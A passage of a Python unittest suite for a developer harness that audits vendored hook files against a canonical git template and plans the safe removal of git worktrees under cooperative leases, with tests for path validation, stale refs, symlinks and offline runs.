        self.assertEqual(self.statuses(result, "human_todo"), ["MISMATCH"])

    def test_drive_absolute_human_todo_is_a_mismatch(self) -> None:
        # The guard exists to catch a declaration that is not repo-relative;
        # a drive-absolute value is exactly that, and PurePosixPath calls it
        # relative because it carries no leading slash.
        for declared in (
            "C:\\Users\\jekyt\\HUMAN_TODO.md",
            "C:/Users/jekyt/HUMAN_TODO.md",
            "C:HUMAN_TODO.md",
            "\\\\server\\share\\HUMAN_TODO.md",
        ):
            with self.subTest(declared=declared):
                repo = self.make_repo(human_todo=declared)
                result = self.audit(repo, FakeCommandRunner())
                self.assertEqual(self.statuses(result, "human_todo"), ["MISMATCH"])
                self.assertIn("not a repo-relative path", self.details(result))
                self.assertFalse(result["ok"])

    def test_an_inaccessible_human_todo_is_unproven_not_a_mismatch(self) -> None:
        # `Path.is_file()` swallows the OS's refusal, so a permissions failure
        # or an unavailable mount produced a hard MISMATCH claiming the file is
        # absent — a repo defect asserted from a machine-state failure.
        repo = self.make_repo(human_todo="HUMAN_TODO.md")
        declared = repo / "HUMAN_TODO.md"
        refused = {declared, repo.resolve() / "HUMAN_TODO.md"}
        real_stat = Path.stat

        def refuse(self: Path, *args: object, **kwargs: object) -> object:
            if self in refused:
                raise PermissionError(13, "Permission denied")
            return real_stat(self, *args, **kwargs)

        with mock.patch.object(harness.Path, "stat", refuse):
            result = self.audit(repo, FakeCommandRunner())
        self.assertEqual(self.statuses(result, "human_todo"), ["UNPROVEN"])
        self.assertIn("could not be inspected", self.details(result))
        self.assertTrue(result["ok"], result["issues"])

    def test_a_malformed_human_todo_is_a_mismatch_not_unproven(self) -> None:
        # A NUL cannot appear in a path on any supported platform, so it is a
        # malformed DECLARATION, not a filesystem that would not answer. Left
        # to the stat guard it surfaced as ValueError -> UNPROVEN -> exit 0.
        repo = self.make_repo(human_todo="HUMAN\x00TODO.md")
        result = self.audit(repo, FakeCommandRunner())
        self.assertEqual(self.statuses(result, "human_todo"), ["MISMATCH"])
        self.assertIn("not a repo-relative path", self.details(result))
        self.assertFalse(result["ok"])

    def test_a_missing_human_todo_is_still_a_mismatch(self) -> None:
        # The guarded stat must not turn ordinary absence into an unproven.
        repo = self.make_repo(human_todo="HUMAN_TODO.md")
        result = self.audit(repo, FakeCommandRunner())
        self.assertEqual(self.statuses(result, "human_todo"), ["MISMATCH"])
        self.assertFalse(result["ok"])

    def test_null_human_todo_above_t1_is_advisory_only(self) -> None:
        repo = self.make_repo(tier=3, human_todo=None)
        result = self.audit(repo, FakeCommandRunner())
        self.assertEqual(self.statuses(result, "human_todo"), ["advisory"])
        self.assertTrue(result["ok"], result["issues"])

    # --- vendored floor bytes versus template versus deployed global ----------

    def test_vendored_floor_drift_from_the_template_is_a_mismatch(self) -> None:
        repo = self.make_repo()
        self.write_floor(repo / "hooks" / "dispatch.py", "1.6.0 (2026-07-01)")
        self.write_floor(
            self.harness_root / "templates" / "hooks" / "dispatch.py",
            "1.6.5 (2026-07-25)",
        )
        self.write_floor(
            self.claude_home / "hooks" / "dispatch.py", "1.6.5 (2026-07-25)"
        )
        runner = self.canonical_reference_runner()
        result = self.audit(repo, runner)
        self.assertEqual(
            self.statuses(result, "vendored hooks/dispatch.py"), ["MISMATCH"]
        )
        detail = self.details(result)
        self.assertIn("1.6.0 (2026-07-01)", detail)
        self.assertIn("1.6.5 (2026-07-25)", detail)
        self.assertFalse(result["ok"])

    def test_matching_floor_copies_pass(self) -> None:
        repo = self.make_repo()
        for path in (
            repo / "hooks" / "dispatch.py",
            self.harness_root / "templates" / "hooks" / "dispatch.py",
            self.claude_home / "hooks" / "dispatch.py",
        ):
            self.write_floor(path, "1.6.5 (2026-07-25)")
        runner = self.canonical_reference_runner()
        result = self.audit(repo, runner)
        self.assertEqual(self.statuses(result, "vendored hooks/dispatch.py"), ["ok"])
        self.assertTrue(result["ok"], result["issues"])

    def test_dirty_harness_checkout_is_not_treated_as_the_reference(self) -> None:
        repo = self.make_repo()
        for path in (
            repo / "hooks" / "dispatch.py",
            self.claude_home / "hooks" / "dispatch.py",
        ):
            self.write_floor(path, "1.6.5 (2026-07-25)")
        self.write_floor(
            self.harness_root / "templates" / "hooks" / "dispatch.py",
            "1.6.5 (2026-07-25)",
        )
        runner = FakeCommandRunner(
            {"rev-parse": (True, "main"), "status --porcelain": (True, " M x")}
        )
        result = self.audit(repo, runner)
        self.assertEqual(
            self.statuses(result, "vendored hooks/dispatch.py"), ["UNPROVEN"]
        )
        self.assertIn("uncommitted templates/hooks changes", self.details(result))
        self.assertTrue(result["ok"])

    def test_a_main_that_diverged_from_origin_is_not_the_reference(self) -> None:
        # Clean on a local `main` is not agreement with the published one:
        # unpushed templates/hooks commits would otherwise be canonical.
        repo = self.make_repo()
        for path in (
            repo / "hooks" / "dispatch.py",
            self.harness_root / "templates" / "hooks" / "dispatch.py",
        ):
            self.write_floor(path, "1.6.5 (2026-07-25)")
        runner = FakeCommandRunner(
            {
                "rev-parse": (True, "main"),
                "status --porcelain": (True, ""),
                "ls-files": (True, "H templates/hooks/dispatch.py"),
                "rev-list": (True, "0\t2"),
            }
        )
        result = self.audit(repo, runner)
        self.assertEqual(
            self.statuses(result, "vendored hooks/dispatch.py"), ["UNPROVEN"]
        )
        self.assertIn("2 ahead of and 0 behind origin/main", self.details(result))

    def test_an_unreadable_published_main_is_not_the_reference(self) -> None:
        # `origin/main` is a LOCAL tracking ref. When the published tip cannot
        # be read, currency is unproven — and an unproven reference must never
        # render as a pass.
        runner = FakeCommandRunner(
            {
                "rev-parse": (True, "main"),
                "status --porcelain": (True, ""),
                "ls-files": (True, "H templates/hooks/dispatch.py"),
            }
        )
        ok, detail = harness.harness_reference_status(
            self.harness_root, runner, deadline=None
        )
        self.assertFalse(ok)
        self.assertIn("published main tip could not be read", detail)
        self.assertIn("cannot be proven current", detail)

    def test_a_hidden_index_flag_disqualifies_the_reference(self) -> None:
        # `skip-worktree` (S) and `assume-unchanged` (lowercase) both make
        # `git status` omit a file's local edits, so a modified template read
        # as clean and was then hashed from the working tree — a vendored copy
        # matching that hidden edit would report `ok` while published HEAD
        # holds different canonical bytes.
        for flags in (
            "S templates/hooks/dispatch.py",
            "h templates/hooks/smoke_test.py",
            "H templates/hooks/dispatch.py\nS templates/hooks/smoke_test.py",
        ):
            with self.subTest(flags=flags):
                runner = self.canonical_reference_runner(**{"ls-files": (True, flags)})
                ok, detail = harness.harness_reference_status(
                    self.harness_root, runner, deadline=None
                )
                self.assertFalse(ok)
                self.assertIn("skip-worktree/assume-unchanged", detail)
        # An unresolvable index is unproven too, never assumed clean.
        runner = self.canonical_reference_runner(**{"ls-files": (False, "")})
        ok, detail = harness.harness_reference_status(
            self.harness_root, runner, deadline=None
        )
        self.assertFalse(ok)
        self.assertIn("index flags", detail)

    def test_a_stale_tracking_ref_is_not_the_reference(self) -> None:
        # `rev-list origin/main...HEAD` returns 0 0 against an unfetched
        # tracking ref, so an obsolete working tree was called canonical and a
        # vendored copy matching that stale template reported `ok`.
        runner = self.canonical_reference_runner(
            **{"ls-remote": (True, "f" * 40 + "\trefs/heads/main")}
        )
        ok, detail = harness.harness_reference_status(
            self.harness_root, runner, deadline=None
        )
        self.assertFalse(ok)
        self.assertIn("local origin/main is stale", detail)
        self.assertIn("ffffffffffff", detail)

    def test_a_level_main_at_the_published_tip_is_the_reference(self) -> None:
        runner = self.canonical_reference_runner()
        ok, detail = harness.harness_reference_status(
            self.harness_root, runner, deadline=None
        )
        self.assertTrue(ok)
        self.assertIn("level with origin/main", detail)
        self.assertIn(PUBLISHED_MAIN_TIP[:12], detail)

    def test_an_offline_run_never_asks_the_remote_for_the_published_tip(self) -> None:
        # `git` is not by itself a local resolver: `ls-remote` contacts the
        # host, so `--offline` still made a network call.
        self.assertFalse(
            harness.command_reaches_the_network(["git", "remote", "--verbose"])
        )
        for argv in (
            ["git", "ls-remote", "origin", "refs/heads/main"],
            ["git", "fetch", "origin"],
            ["git", "remote", "show", "origin"],
            ["gh", "repo", "view", "acme/widgets"],
        ):
            with self.subTest(argv=argv):
                self.assertTrue(harness.command_reaches_the_network(argv))
                self.assertEqual(harness.local_only_command_output(argv), (False, ""))

        # An otherwise canonical checkout audited offline: the reference is
        # UNPROVEN with the reason, never a silent pass.
        class OfflineRunner(FakeCommandRunner):
            def __call__(self, argv, cwd=None, **kwargs):
                if harness.command_reaches_the_network(argv):
                    self.calls.append(list(argv))
                    return False, ""
                return super().__call__(argv, cwd, **kwargs)

        offline = OfflineRunner(self.canonical_reference_runner().responses)
        ok, detail = harness.harness_reference_status(
            self.harness_root, offline, deadline=None
        )
        self.assertFalse(ok)
        self.assertIn("published main tip could not be read", detail)

    def test_floor_branch_checkout_is_not_treated_as_the_reference(self) -> None:
        repo = self.make_repo()
        for path in (
            repo / "hooks" / "dispatch.py",
            self.claude_home / "hooks" / "dispatch.py",
            self.harness_root / "templates" / "hooks" / "dispatch.py",
        ):
            self.write_floor(path, "1.6.5 (2026-07-25)")
        runner = FakeCommandRunner(
            {"rev-parse": (True, "floor/next"), "status --porcelain": (True, "")}
        )
        result = self.audit(repo, runner)
        self.assertEqual(
            self.statuses(result, "vendored hooks/dispatch.py"), ["UNPROVEN"]
        )
        self.assertIn("not main", self.details(result))

    def test_deployed_global_drift_never_fails_a_repo_audit(self) -> None:
        # `~/.claude/hooks` is the AUDITING MACHINE's state. A developer who
        # has not run `sync-global --apply` must not turn a repo gate red, and
        # the same repo must not silently pass on a runner with no ~/.claude.
        repo = self.make_repo()
        self.write_floor(repo / "hooks" / "dispatch.py", "1.6.5 (2026-07-25)")
        self.write_floor(
            self.harness_root / "templates" / "hooks" / "dispatch.py",
            "1.6.5 (2026-07-25)",
        )
        self.write_floor(
            self.claude_home / "hooks" / "dispatch.py", "1.6.0 (2026-07-01)"
        )
        runner = self.canonical_reference_runner()
        result = self.audit(repo, runner)
        self.assertEqual(
            self.statuses(result, "vendored hooks/dispatch.py"), ["advisory"]
        )
        self.assertIn("machine-state observation", self.details(result))
        self.assertTrue(result["ok"], result["issues"])

    def test_real_drift_still_fails_when_the_machine_is_behind(self) -> None:
        # The loosening above must not swallow genuine repo drift: vendored
        # bytes that differ from the canonical template still fail, even while
        # the deployed global copy on this machine is itself stale.
        repo = self.make_repo()
        self.write_floor(repo / "hooks" / "dispatch.py", "1.5.0 (2026-06-01)")
        self.write_floor(
            self.harness_root / "templates" / "hooks" / "dispatch.py",
            "1.6.5 (2026-07-25)",
        )
        self.write_floor(
            self.claude_home / "hooks" / "dispatch.py", "1.6.0 (2026-07-01)"
        )
        runner = self.canonical_reference_runner()
        result = self.audit(repo, runner)
        self.assertEqual(
            self.statuses(result, "vendored hooks/dispatch.py"), ["MISMATCH"]
        )
        self.assertFalse(result["ok"])

    def test_deployed_drift_without_a_provable_template_stays_unproven(self) -> None:
        repo = self.make_repo()
        self.write_floor(repo / "hooks" / "dispatch.py", "1.6.0 (2026-07-01)")
        self.write_floor(
            self.claude_home / "hooks" / "dispatch.py", "1.6.5 (2026-07-25)"
        )
        runner = FakeCommandRunner(
            {"rev-parse": (True, "floor/next"), "status --porcelain": (True, "")}
        )
        result = self.audit(repo, runner)
        self.assertEqual(
            self.statuses(result, "vendored hooks/dispatch.py"), ["UNPROVEN"]
        )
        self.assertIn("deployed global copy", self.details(result))
        self.assertTrue(result["ok"])

    def test_an_inaccessible_vendored_path_is_unproven_not_ok(self) -> None:
        # `Path.is_file()` answers False for both "absent" and "the OS refused
        # to tell me", so a permissions or transient filesystem failure printed
        # `[ok] no vendored floor copy` for a repo that may well vendor one.
        repo = self.make_repo()
        denied = repo / "hooks" / "dispatch.py"
        # `audit_repo` walks the GIT ROOT, which on macOS resolves
        # /var/folders/... to /private/var/folders/..., so the refusal has to
        # recognize both spellings of the same file.
        refused = {denied, repo.resolve() / "hooks" / "dispatch.py"}
        real_stat = Path.stat

        def refuse(self: Path, *args: object, **kwargs: object) -> object:
            if self in refused:
                raise PermissionError(13, "Permission denied")
            return real_stat(self, *args, **kwargs)

        with mock.patch.object(harness.Path, "stat", refuse):
            self.assertEqual(
                harness.file_presence(denied)[0],
                False,
            )
            self.assertIn("could not be inspected", harness.file_presence(denied)[1])
            result = self.audit(repo, FakeCommandRunner())
        self.assertEqual(
            self.statuses(result, "vendored hooks/dispatch.py"), ["UNPROVEN"]
        )
        self.assertNotIn("no vendored floor copy", self.details(result))
        # Unprovable is not a repo defect, so it does not fail the audit.
        self.assertTrue(result["ok"], result["issues"])

    @unittest.skipUnless(
        hasattr(os, "symlink"), "platform cannot create symbolic links"
    )
    def test_a_symlinked_vendored_floor_is_unproven_not_matching(self) -> None:
        # `stat()` follows links, so a `hooks/dispatch.py` symlinked to the
        # harness template hashed the TARGET and reported the repo as matching
        # canonical bytes — while the repo vendors none and the link may
        # resolve elsewhere, or nowhere, on the next machine.
        repo = self.make_repo()
        template = self.harness_root / "templates" / "hooks" / "dispatch.py"
        self.write_floor(template, "1.6.5 (2026-07-25)")
        link = repo / "hooks" / "dispatch.py"
        link.parent.mkdir(parents=True, exist_ok=True)
        try:
            os.symlink(template, link)
        except (OSError, NotImplementedError) as exc:
            self.skipTest(f"cannot create a symlink here: {exc}")
        result = self.audit(repo, self.canonical_reference_runner())
        self.assertEqual(
            self.statuses(result, "vendored hooks/dispatch.py"), ["UNPROVEN"]
        )
        self.assertIn("is a symlink to", self.details(result))
        # Unprovable is not a repo defect, so it does not fail the audit.
        self.assertTrue(result["ok"], result["issues"])

    def test_a_linked_vendored_floor_is_unproven_on_every_platform(self) -> None:
        # The real-symlink test above needs a privilege Windows withholds, so
        # this one drives the same branch through the seam and runs everywhere.
        repo = self.make_repo()
        self.write_floor(repo / "hooks" / "dispatch.py", "1.6.5 (2026-07-25)")
        self.write_floor(
            self.harness_root / "templates" / "hooks" / "dispatch.py",
            "1.6.5 (2026-07-25)",
        )
        linked = repo / "hooks" / "dispatch.py"

        def fake_symlink_target(path: Path) -> str:
            # `audit_repo` walks the GIT ROOT, which spells the same file
            # differently from the fixture path: macOS resolves /var ->
            # /private/var, and a Windows runner hands back an 8.3 short name
            # (C:\Users\RUNNER~1\...) that `realpath` does not expand. Compare
            # by stat identity, which is immune to both spellings.
            try:
                same = os.path.samefile(path, linked)
            except OSError:
                same = False
            return "/elsewhere/dispatch.py" if same else ""

        with mock.patch.object(
            harness, "symlink_target", side_effect=fake_symlink_target
        ):
            result = self.audit(repo, self.canonical_reference_runner())
        self.assertEqual(
            self.statuses(result, "vendored hooks/dispatch.py"), ["UNPROVEN"]
        )
        self.assertIn("is a symlink to /elsewhere/dispatch.py", self.details(result))
        self.assertTrue(result["ok"], result["issues"])
        # Without the link the identical bytes still compare as `ok`, so the
        # new branch is what changed the verdict.
        plain = self.audit(repo, self.canonical_reference_runner())
        self.assertEqual(self.statuses(plain, "vendored hooks/dispatch.py"), ["ok"])

    def test_a_dangling_vendored_symlink_is_unproven_not_absent(self) -> None:
        # `file_presence` FOLLOWS the link, so a broken one answered (False,
        # "") and the symlink branch — guarded on `present` — never ran:
        # `[ok] no vendored floor copy` for a repo that plainly declares one.
        repo = self.make_repo()
        dangling = repo / "hooks" / "dispatch.py"

        def fake_symlink_target(path: Path) -> str:
            same = os.path.realpath(path) == os.path.realpath(dangling)
            return "/gone/dispatch.py" if same else ""

        with mock.patch.object(
            harness, "symlink_target", side_effect=fake_symlink_target
        ):
            result = self.audit(repo, self.canonical_reference_runner())
        self.assertEqual(
            self.statuses(result, "vendored hooks/dispatch.py"), ["UNPROVEN"]
        )
        self.assertIn("is a symlink to /gone/dispatch.py", self.details(result))
        self.assertNotIn("no vendored floor copy", self.details(result))
        self.assertTrue(result["ok"], result["issues"])

    def test_an_absent_vendored_path_is_still_a_clean_ok(self) -> None:
        # The guarded stat must not turn ordinary absence into an unproven.
        repo = self.make_repo()
        self.assertEqual(
            harness.file_presence(repo / "hooks" / "dispatch.py"), (False, "")
        )
        result = self.audit(repo, FakeCommandRunner())
        self.assertEqual(self.statuses(result, "vendored floor bytes"), ["ok"])

    def test_repo_without_vendored_hooks_spawns_no_reference_probe(self) -> None:
        repo = self.make_repo()
        runner = FakeCommandRunner()
        result = self.audit(repo, runner)
        self.assertEqual(runner.calls, [])
        # The leg still reports: "nothing vendored" must be distinguishable
        # from "this check never ran".
        self.assertEqual(self.statuses(result, "vendored floor bytes"), ["ok"])
        self.assertIn("no vendored floor copy under", self.details(result))

    def test_a_dot_claude_vendored_floor_is_compared_too(self) -> None:
        # `.claude/hooks/` is the vendored shape doctor itself recognizes;
        # probing only `hooks/` made the whole leg a permanent no-op.
        repo = self.make_repo()
        self.write_floor(repo / ".claude" / "hooks" / "dispatch.py", "1.6.0")
        self.write_floor(
            self.harness_root / "templates" / "hooks" / "dispatch.py", "1.6.5"
        )
        self.write_floor(self.claude_home / "hooks" / "dispatch.py", "1.6.5")
        runner = self.canonical_reference_runner()
        result = self.audit(repo, runner)
        self.assertEqual(
            self.statuses(result, "vendored .claude/hooks/dispatch.py"), ["MISMATCH"]
        )
        self.assertFalse(result["ok"])

    # --- reporting ------------------------------------------------------------

    def render_audit(
        self, repo: Path, runner: FakeCommandRunner, *, as_json: bool = False
    ) -> tuple[int, str]:
        """Run `audit_command` against the FIXTURE world, never the real one."""
        output = io.StringIO()
        with redirect_stdout(output):
            code = harness.audit_command(
                SimpleNamespace(path=str(repo), json=as_json),
                harness_root=self.harness_root,
                claude_home=self.claude_home,
                command_runner=runner,
            )
        return code, output.getvalue()

    def test_audit_command_prints_findings_and_fails_on_a_mismatch(self) -> None:
        repo = self.make_repo(human_todo="HUMAN_TODO.md")
        code, text = self.render_audit(repo, FakeCommandRunner())
        self.assertEqual(code, 1)
        self.assertIn("[MISMATCH] human_todo vs the file on disk", text)
        self.assertNotIn("[ok] harness audit", text)

    def test_unproven_findings_are_counted_in_the_summary_and_json(self) -> None:
        # "[ok] harness audit" after a run that measured nothing reads as a
        # pass. Say how much of the run was actually proven.
        repo = self.make_repo()
        self.write_floor(repo / "hooks" / "dispatch.py", "1.6.5 (2026-07-25)")
        runner = FakeCommandRunner(
            {"rev-parse": (True, "floor/next"), "status --porcelain": (True, "")}
        )
        result = self.audit(repo, runner)
        self.assertEqual(result["unproven"], 1)
        self.assertTrue(result["ok"])
        _code, text = self.render_audit(repo, runner)
        self.assertIn("[UNPROVEN]", text)
        self.assertNotIn("\n[ok] harness audit\n", text)

    def test_the_rendered_audit_never_reads_the_real_harness_checkout(self) -> None:
        # Regression guard: without injection this leg fell back to the real
        # `Path(harness.__file__).parent`, the real `~/.claude` and a real
        # `git`, so its verdict depended on the branch and cleanliness of the
        # machine running the tests.
        repo = self.make_repo()
        self.write_floor(repo / "hooks" / "dispatch.py", "1.6.5 (2026-07-25)")
        runner = self.canonical_reference_runner()
        self.render_audit(repo, runner)
        self.assertTrue(runner.calls, "the injected resolver was never consulted")
        for argv in runner.calls:
            self.assertEqual(argv[0], "git")

    def test_audit_json_output_carries_every_finding(self) -> None:
        repo = self.make_repo(tier=3, human_todo=None)
        code, text = self.render_audit(repo, FakeCommandRunner(), as_json=True)
        payload = json.loads(text)
        self.assertEqual(code, 0)
        self.assertEqual(
            [finding["status"] for finding in payload["reality"]], ["ok", "advisory"]
        )


class WorktreeCloseoutTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temp = tempfile.TemporaryDirectory()
        self.base = harness.canonical_worktree_path(Path(self.temp.name), strict=True)
        self.remote = self.base / "remote.git"
        self.repo = self.base / "repo"
        self.claimant = "test-session"
        subprocess.run(["git", "init", "--bare", "-q", str(self.remote)], check=True)
        subprocess.run(["git", "init", "-q", str(self.repo)], check=True)
        self.git("config", "user.email", "test@example.com")
        self.git("config", "user.name", "Harness Test")
        (self.repo / "README.md").write_text("fixture\n", encoding="utf-8")
        (self.repo / ".gitignore").write_text("private-report.md\n", encoding="utf-8")
        self.git("add", "README.md", ".gitignore")
        self.git("commit", "-qm", "create fixture")
        self.git("branch", "-M", "main")
        self.git("remote", "add", "origin", str(self.remote))
        self.git("push", "-qu", "origin", "main")
        (self.repo / ".worktrees").mkdir()

    def tearDown(self) -> None:
        self.temp.cleanup()

    def git(
        self, *args: str, cwd: Path | None = None, check: bool = True
    ) -> subprocess.CompletedProcess[str]:
        return subprocess.run(
            ["git", *args],
            cwd=cwd or self.repo,
            capture_output=True,
            text=True,
            check=check,
        )

    def add_worktree(
        self,
        name: str,
        *,
        branch: str | None = None,
        detached: bool = False,
        lease: bool = True,
    ) -> Path:
        worktree = self.repo / ".worktrees" / name
        args = ["worktree", "add"]
        if detached:
            args.append("--detach")
        else:
            args.extend(["-b", branch or f"test/{name}"])
        args.extend([str(worktree), "origin/main"])
        self.git(*args)
        if lease:
            self.acquire_lease(worktree)
        return worktree

    def acquire_lease(
        self,
        worktree: Path,
        *,
        claimant: str | None = None,
        ttl_seconds: float = harness.WORKTREE_OWNERSHIP_DEFAULT_SECONDS,
        replace_stale: bool = False,
        now=None,
    ) -> dict[str, object]:
        kwargs = {}
        if now is not None:
            kwargs["now"] = now
        return harness.mutate_worktree_lease(
            worktree,
            action="acquire",
            claimant=claimant or self.claimant,
            ttl_seconds=ttl_seconds,
            replace_stale=replace_stale,
            **kwargs,
        )

    def plan(
        self, *, refresh: bool = True, claimant: str | None = None, **kwargs
    ) -> dict[str, object]:
        kwargs.setdefault("process_cwd", self.repo)
        return harness.worktree_plan(
            self.repo,
            refresh=refresh,
            claimant=claimant or self.claimant,
            **kwargs,
        )

    @staticmethod
    def candidate(plan: dict[str, object], path: Path) -> dict[str, object]:
        expected_path = harness.canonical_worktree_path(path, strict=path.exists())
        expected = harness.worktree_path_key(expected_path)
        for candidate in plan["worktrees"]:
            if candidate["path_key"] == expected or (
                candidate["path_key"] is None
                and harness.worktree_path_key(Path(candidate["path"])) == expected
            ):
                return candidate
        raise AssertionError(f"missing worktree candidate: {path}")

    @staticmethod
    def fail_list_after_first_remove_runner():
        calls: list[list[str]] = []
        state = {"removals": 0, "failed_lists": 0}

        def runner(
            command: list[str], cwd: Path, *, stdin_text: str | None = None
        ) -> subprocess.CompletedProcess[str]:
            calls.append(command.copy())
            if command[1:3] == ["worktree", "list"] and state["removals"]:
                state["failed_lists"] += 1
                return subprocess.CompletedProcess(
                    command, 6, "misleading", "controlled list failure"
                )
            result = harness.worktree_git_runner(command, cwd, stdin_text=stdin_text)
            if command[1:3] == ["worktree", "remove"] and not result.returncode:
                state["removals"] += 1
            return result

        return runner, calls, state

    def test_cooperative_lease_lifecycle_is_exclusive_explicit_and_expiring(
        self,
    ) -> None:
        worktree = self.add_worktree("lease-lifecycle", lease=False)
        start = datetime(2026, 7, 31, 9, 0, tzinfo=timezone.utc)
        missing = self.candidate(self.plan(now=lambda: start), worktree)
        self.assertIn("cooperative_lease_missing", missing["reasons"])

        acquired = self.acquire_lease(worktree, ttl_seconds=30, now=lambda: start)
        lease_id = acquired["lease"]["lease_id"]
        owned = self.candidate(
            self.plan(now=lambda: start + timedelta(seconds=5)), worktree
        )
        self.assertEqual(owned["verdict"], "remove")

        with self.assertRaisesRegex(harness.HarnessError, "renewal refused"):
            harness.mutate_worktree_lease(
                worktree,
                action="renew",
                claimant="other-session",
                now=lambda: start + timedelta(seconds=10),
            )
        renewed = harness.mutate_worktree_lease(
            worktree,
            action="renew",
            claimant=self.claimant,
            ttl_seconds=50,
            now=lambda: start + timedelta(seconds=10),
        )
        self.assertEqual(renewed["lease"]["lease_id"], lease_id)

        occupied = self.candidate(
            self.plan(
                claimant="other-session",
                now=lambda: start + timedelta(seconds=11),
            ),
            worktree,
        )
        self.assertIn("cooperative_lease_owned_by_other", occupied["reasons"])

        expired = self.candidate(
            self.plan(now=lambda: start + timedelta(seconds=61)), worktree
        )
        self.assertIn("cooperative_lease_expired", expired["reasons"])
        with self.assertRaisesRegex(harness.HarnessError, "replace-stale"):
            self.acquire_lease(
                worktree,
                claimant="successor",
                now=lambda: start + timedelta(seconds=61),
            )
        replaced = self.acquire_lease(
            worktree,
            claimant="successor",
            replace_stale=True,
            now=lambda: start + timedelta(seconds=61),
        )
        self.assertNotEqual(replaced["lease"]["lease_id"], lease_id)
        with self.assertRaisesRegex(harness.HarnessError, "release refused"):
            harness.mutate_worktree_lease(
                worktree,
                action="release",
                claimant=self.claimant,
                now=lambda: start + timedelta(seconds=62),
            )
        released = harness.mutate_worktree_lease(
            worktree,
            action="release",
            claimant="successor",
            now=lambda: start + timedelta(seconds=62),
        )
        self.assertTrue(released["ok"])
        after_release = self.candidate(
            self.plan(
                claimant="successor",
                now=lambda: start + timedelta(seconds=62),
            ),
            worktree,
        )
        self.assertIn("cooperative_lease_missing", after_release["reasons"])

    def test_malformed_and_mismatched_leases_fail_closed(self) -> None:
        worktree = self.add_worktree("bad-lease")
        plan = self.plan()
        lease_path = Path(self.candidate(plan, worktree)["lease"]["path"])

        lease_path.write_text("{not json", encoding="utf-8")
        malformed = self.candidate(self.plan(), worktree)
        self.assertIn("cooperative_lease_malformed", malformed["reasons"])

        lease_path.unlink()
        acquired = self.acquire_lease(worktree)
        record = acquired["lease"]["record"].copy()
        record["worktree"] = str(self.repo)
        harness.write_worktree_lease(lease_path, record)
        mismatched = self.candidate(self.plan(), worktree)
        self.assertIn("cooperative_lease_identity_mismatch", mismatched["reasons"])

    def test_canonical_identity_collapses_aliases_and_drives_reported_path(
        self,
    ) -> None:
        worktree = self.add_worktree("canonical")
        candidate = self.candidate(self.plan(), worktree)
        canonical = harness.canonical_worktree_path(worktree)
        self.assertEqual(candidate["path"], str(canonical))
        self.assertEqual(candidate["path_key"], harness.worktree_path_key(canonical))

        alias = self.base / "canonical-alias"
        try:
            alias.symlink_to(worktree, target_is_directory=True)
        except OSError:
            return
        self.assertTrue(
            harness.same_worktree_path(
                harness.canonical_worktree_path(alias), canonical
            )
        )

    def test_current_and_other_claimant_occupied_worktrees_are_retained(self) -> None:
        current = self.add_worktree("current")
        occupied = self.add_worktree("occupied", lease=False)
        self.acquire_lease(occupied, claimant="another-agent")
        plan = self.plan(process_cwd=current)
        self.assertIn("process_cwd_occupied", self.candidate(plan, current)["reasons"])
        self.assertIn(
            "cooperative_lease_owned_by_other",
            self.candidate(plan, occupied)["reasons"],
        )

    def test_default_is_read_only_and_does_not_trust_stale_remote_refs(self) -> None:
        worktree = self.add_worktree("read-only")
        plan = self.plan(refresh=False)
        candidate = self.candidate(plan, worktree)
        self.assertEqual(candidate["verdict"], "keep")
        self.assertIn("remote_evidence_not_refreshed", candidate["reasons"])
        self.assertTrue(worktree.is_dir())

        with self.assertRaisesRegex(harness.HarnessError, "requires --refresh"):
            harness.worktrees_command(
                SimpleNamespace(
                    repo=str(self.repo), refresh=False, apply=True, json=True
                )
            )
        with self.assertRaisesRegex(harness.HarnessError, "requires --claimant"):
            harness.worktrees_command(
                SimpleNamespace(
                    repo=str(self.repo),
                    refresh=True,
                    apply=True,
                    claimant=None,
                    json=True,
                )
            )

    def test_refreshed_remote_containment_makes_a_clean_candidate_removable(
        self,
    ) -> None:
        worktree = self.add_worktree("contained")
        candidate = self.candidate(self.plan(), worktree)
        self.assertEqual(candidate["verdict"], "remove")
        self.assertEqual(
            [item["ref"] for item in candidate["containing_remote_refs"]],
            ["refs/remotes/origin/main"],
        )

    def test_detached_candidate_is_retained_despite_remote_containment(self) -> None:
        worktree = self.add_worktree("detached-contained", detached=True)
        plan = self.plan()
        candidate = self.candidate(plan, worktree)
        self.assertEqual(candidate["verdict"], "keep")
        self.assertIn("detached_head", candidate["reasons"])
        self.assertEqual(
            [item["ref"] for item in candidate["containing_remote_refs"]],
            ["refs/remotes/origin/main"],
        )
        self.assertTrue(harness.apply_worktree_plan(plan))
        self.assertTrue(worktree.is_dir())

    def test_remote_tracking_symbolic_head_is_not_a_local_branch(self) -> None:
        worktree = self.add_worktree("remote-symbolic", detached=True)
        self.git("symbolic-ref", "HEAD", "refs/remotes/origin/main", cwd=worktree)
        plan = self.plan()
        candidate = self.candidate(plan, worktree)
        self.assertFalse(candidate["detached"])
        self.assertEqual(candidate["branch"], "refs/remotes/origin/main")
        self.assertEqual(candidate["verdict"], "keep")
        self.assertIn("head_not_on_local_branch", candidate["reasons"])
        self.assertTrue(harness.apply_worktree_plan(plan))
        self.assertTrue(worktree.is_dir())

    def test_tracked_untracked_and_ignored_content_are_preservation_blockers(
        self,
    ) -> None:
        tracked = self.add_worktree("tracked")
        untracked = self.add_worktree("untracked")
        ignored = self.add_worktree("ignored")
        (tracked / "README.md").write_text("changed\n", encoding="utf-8")
        (untracked / "scratch.txt").write_text("keep\n", encoding="utf-8")
        (ignored / "private-report.md").write_text("private\n", encoding="utf-8")

        plan = self.plan()
        for path, reason in (
            (tracked, "tracked_or_untracked_changes"),
            (untracked, "tracked_or_untracked_changes"),
            (ignored, "ignored_files"),
        ):
            with self.subTest(path=path.name):
                candidate = self.candidate(plan, path)
                self.assertEqual(candidate["verdict"], "keep")
                self.assertIn(reason, candidate["reasons"])

    def test_staged_content_is_a_preservation_blocker(self) -> None:
        staged = self.add_worktree("staged")
        (staged / "staged.txt").write_text("keep\n", encoding="utf-8")
        self.git("add", "staged.txt", cwd=staged)

        candidate = self.candidate(self.plan(), staged)
        self.assertEqual(candidate["verdict"], "keep")
        self.assertIn("tracked_or_untracked_changes", candidate["reasons"])
        self.assertTrue(any(entry.startswith("A ") for entry in candidate["changes"]))

    def test_clean_detached_commit_must_reach_a_remote_tracking_ref(self) -> None:
        worktree = self.add_worktree("unreachable", detached=True)
        (worktree / "only-here.txt").write_text("local\n", encoding="utf-8")
        self.git("add", "only-here.txt", cwd=worktree)
        self.git("commit", "-qm", "local detached commit", cwd=worktree)

        candidate = self.candidate(self.plan(), worktree)
